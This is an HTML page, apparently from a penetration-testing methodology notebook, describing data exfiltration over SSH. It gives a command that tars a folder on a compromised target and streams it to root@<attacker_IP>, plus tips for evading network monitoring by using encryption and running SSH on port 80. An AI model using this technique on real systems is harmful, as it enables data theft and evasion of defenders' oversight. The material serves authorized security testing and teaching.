<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exfiltration over SSH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exfiltration over SSH</h1><br/>the data is encrypted(not encode as in &quot;<a href="-Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Data_Exfiltration--Exfiltration_over_TCP_Socket_with_EBCDIC_and_Base64.html">Exfiltration ver TCP Socket</a>&quot;) since we’re using SSH. This method is more likely to evade any on-the-wire heuristics.<br /><br />1. On our target system, we tar the contents of our /tmp/datafolder while sending the output to stdout (-) and then SSH it over to our attacker system while untar’ing the contents into the /tmp/datafolder directory on the attacker side simultaneously:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ <span style="color:#ff9d00;font-weight:700">tar</span> zcf - <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>datafolder <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">ssh</span> root@&lt;attacker_IP&gt; <span style="color:#3ad900;font-weight:400">&quot;cd /tmp; tar zxpf -&quot;</span></pre></div><br />2. On our attacker system, the data is already untar’d and in the /tmp folder of the attacker<br /><br /><strong>extra stealthiness</strong> <br />we could configure our SSH server on port 80 for instance. Just in case the customer is monitoring for SSH traffic over the standard port 22</div>
</body>
</html>
